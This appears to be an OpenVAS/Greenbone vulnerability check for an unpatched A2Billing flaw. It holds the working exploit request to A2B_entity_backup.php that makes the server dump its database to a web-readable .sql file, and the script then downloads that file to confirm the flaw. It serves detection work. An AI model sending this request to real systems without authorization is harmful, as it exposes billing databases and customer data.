###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_a2billing_rce.nasl 12043 2018-10-23 14:16:52Z mmartin $
#
# A2billing Backup File Download / Remote Code Execution Vulnerabilities
#
# Authors:
# Tameem Eissa <teissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:a2billing:a2billing";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107237");
  script_version("$Revision: 12043 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"last_modification", value:"$Date: 2018-10-23 16:16:52 +0200 (Tue, 23 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-09-08 20:31:53 +0200 (Fri, 08 Sep 2017)");
  script_name("A2billing Backup File Download / Remote Code Execution Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with A2billing and is prone to backup file download and remote code execution vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerabilities are located in the A2B_entity_backup.php due to non proper use of MYSQLDUMP command execution on a file passed through the GET request.");

  script_tag(name:"impact", value:"Remote attackers are able to read the a2billing database file or even pass a malicious .php file that can lead to access to a random system file (e.g. /etc/passwd.");

  script_tag(name:"affected", value:"All versions of A2Billing");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"https://0x4148.com/2016/10/28/a2billing-rce/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42616/");
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_a2billing_detect.nasl");
  script_mandatory_keys("a2billing/installed");
  script_require_ports("Services/www", 443);
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

rand = rand_str(length: 20, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
url = dir + "/A2B_entity_backup.php?form_action=add&path=" + rand + ".sql";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
sleep(5);

url = dir + "/" + rand + ".sql";

if (http_vuln_check(port: port, url: url, pattern: "MySQL dump", check_header: TRUE)) {
  report = "It was possible to execute SQL dump remotely, the SQL dump can be accessed at " +
           report_vuln_url(port: port, url: url, url_only: TRUE) + ".\n\nPlease remove this file.";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
